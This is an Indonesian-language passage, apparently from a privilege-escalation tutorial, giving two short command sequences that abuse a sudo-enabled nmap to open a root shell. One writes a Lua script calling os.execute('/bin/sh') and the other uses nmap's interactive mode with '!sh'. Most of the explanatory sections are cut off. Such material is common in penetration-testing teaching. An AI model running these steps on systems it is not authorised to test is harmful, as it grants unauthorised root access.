...
Langkah-langkah
Buat file skrip sementara:
bash
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
Jalankan Nmap dengan flag --script mengarah ke file tersebut:
bash
sudo nmap --script=$TF
Shell root akan terbuka secara langsung (#).
Kenapa ini bekerja
...
bash
nmap --interactive
Dari prompt nmap>, panggil shell sistem:
nmap> !sh
Shell root akan terbuka.
Kenapa ini bekerja
